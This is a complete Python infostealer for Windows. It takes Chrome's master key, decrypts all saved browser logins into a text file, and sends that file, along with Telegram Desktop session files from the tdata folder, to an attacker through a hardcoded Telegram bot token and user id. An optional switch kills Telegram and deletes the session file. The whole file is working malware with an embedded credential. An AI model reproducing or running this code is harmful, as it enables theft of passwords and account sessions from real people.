try:
    from telebot import TeleBot
    import shutil
    import json
    from base64 import b64decode
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    import os
    import sqlite3
except:
    print("Error importing")
    pass


log_out = 0  # 1 - is on, 0 - is off


user_id = 441449437
token = '1265089268:AAEfhXYnRGe0Npj_DXxmN9aXZpVh8U4sO_g'
name_ur_txt = 'pass.txt'


bot = TeleBot(token)
pathusr = os.path.expanduser('~')
paths = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/']
path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')


def getmasterkey():
    try:
        with open(path) as f:
            load = json.load(f)["os_crypt"]["encrypted_key"]
            master_key = b64decode(load)
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        print("can't access masterkey")
        pass


def decryption(buff, key):
    payload = buff[15:]
    iv = buff[3:15]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def Chrome():
    text = 'YOUR PASSWORDS\n'
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                         os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                password = result[2]
                login = result[1]
                url = result[0]
                decrypted_pass = decryption(password, getmasterkey())
                text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
                with open(name_ur_txt, "w", encoding="utf-8") as f:
                    f.write(text)
    except:
        print("error in Chrome()")
        pass


def finddir(path):
    for root, dirs, files in os.walk(path):
        for name in dirs:
            if name == "Telegram Desktop":
                found = os.path.join(root, name)
                print(found)
                if os.path.exists(found + '\\Telegram.exe'):
                    return found


if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
    tddir = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
    tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
else:
    for i in paths:
        tddir = finddir(i)
        if tddir is not None:
            tdata_path = tddir + '\\tdata\\'
            break
        else:
            pass


def logout_windows(bool):
    if bool:
        try:
            global pathd877
            os.system('taskkill /f /im Telegram.exe')
            os.remove(pathd877)
        except Exception as e:
            print("failed to logout")
            print(repr(e))
            pass
    else:
        print("logout is not on")
        pass


def send_txt():
    try:
        bot.send_document(user_id, open(name_ur_txt,'rb'))
        os.remove(name_ur_txt)
    except Exception as e:
        print("Error in send_txt()")
        print(repr(e))
        pass


def send_session_files():
    for root, dirs, files in os.walk(tdata_path):
        for dir in dirs:
            if dir[0:15] == "D877F783D5D3EF8":
                mapsdir = os.path.join(tdata_path, dir)
        for file in files:
            if file[0:15] == "D877F783D5D3EF8":
                print("match D877F783D5D3EF8")
                global pathd877
                pathd877 = os.path.join(tdata_path, file)
                bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'))
            elif file == "maps":
                print("match maps")
                bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'))


def main():
    try:
        Chrome()
        user = pathusr + " " + tddir
        bot.send_message(user_id, user)
        send_txt()
        send_session_files()
        logout_windows(log_out)
    except Exception as e:
        print(repr(e), 'Main function error')
        pass


if __name__ == '__main__':
    main()

